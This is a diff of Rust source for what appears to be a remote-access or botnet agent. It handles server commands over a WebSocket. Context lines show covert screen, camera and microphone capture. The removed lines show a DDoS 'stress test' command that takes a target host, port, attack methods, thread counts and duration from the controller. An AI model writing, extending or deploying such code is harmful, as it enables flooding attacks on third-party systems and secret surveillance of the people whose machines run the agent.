@@ -1,11 +1,9 @@
 use serde_json::Value;
 
-use libra_common::models::StressConfig;
 use libra_common::protocol::{WebSocketMessage, ws_type};
 use libra_crypto::AgentCrypto;
 use libra_comm::http::HttpCommunicator;
 use libra_comm::ws::{WsCommunicator, WsSender, ws_send_via, send_msg_via};
-use libra_modules::stress_test::DdosModule;
 use libra_platform::get_executor;
 
 use crate::config::ConfigManager;
@@ -25,7 +23,6 @@ pub struct AgentEngine {
     agent_id: String,
     screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
     camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
-    ddos_module: DdosModule,
 }
 
 impl AgentEngine {
@@ -39,7 +36,6 @@ impl AgentEngine {
             agent_id: String::new(),
             screen_session: std::sync::Mutex::new(None),
             camera_session: std::sync::Mutex::new(None),
-            ddos_module: DdosModule::new(),
         }
     }
 
@@ -580,35 +576,6 @@ impl AgentEngine {
             ws_type::MIC_UNBIND => {
                 let r = libra_modules::execution::MicCapture::stop_capture();
                 ws_send(tx, &agent_id, "mic.unbind.result", &r, rid).await;
-            }
-
-            // ── Stress test ───────────────────────────────────────
-            ws_type::STRESS_START => {
-                if let Some(ref d) = data {
-                    let config = StressConfig {
-                        campaign_id: d["campaignId"].as_str().unwrap_or("").into(),
-                        target_host: d["targetHost"].as_str().unwrap_or("").into(),
-                        target_port: d["targetPort"].as_u64().unwrap_or(80) as u16,
-                        methods: d["methods"].as_array()
-                            .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
-                            .unwrap_or_default(),
-                        duration_seconds: d["durationSeconds"].as_u64().unwrap_or(60),
-                        threads_per_agent: d["threadsPerAgent"].as_u64().unwrap_or(100) as u32,
-                        packet_size: d["packetSize"].as_u64().unwrap_or(1024) as usize,
-                        max_connections: d["maxConnections"].as_u64().unwrap_or(500) as usize,
-                        http_path: d["httpPath"].as_str().unwrap_or("/").into(),
-                    };
-                    self.ddos_module.start(config).await;
-                }
-                ws_send(tx, &agent_id, "stress.start.result", r#"{"status":"started"}"#, rid).await;
-            }
-            ws_type::STRESS_STOP => {
-                ws_send(tx, &agent_id, "stress.stop.result", r#"{"status":"stopped"}"#, rid).await;
-            }
-            ws_type::STRESS_STATUS => {
-                let status = self.ddos_module.build_status("", &agent_id, "");
-                let json = serde_json::to_string(&status).unwrap_or_default();
-                ws_send(tx, &agent_id, "stress.status.result", &json, rid).await;
             }
 
             _ => {} // Unknown type — ignore
